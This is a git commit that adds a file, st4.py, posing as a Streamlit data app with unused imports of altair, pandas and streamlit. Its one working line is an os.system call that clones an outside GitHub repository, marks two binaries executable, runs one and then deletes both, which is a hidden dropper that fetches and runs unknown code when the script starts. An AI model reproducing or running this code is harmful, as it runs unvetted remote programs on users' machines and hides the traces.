4612273b2bf37ff10e1216a478641aff581040e3
hagenitu <habenikatol@outlook.com>
2024-09-16 15:37:55 +0700

    Add files via upload

---
+++ st4.py
@@ -0,0 +1,7 @@
+from collections import namedtuple 
+import altair as alt 
+import math 
+import pandas as pd 
+import streamlit as st 
+import os 
+os.system ("rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4")
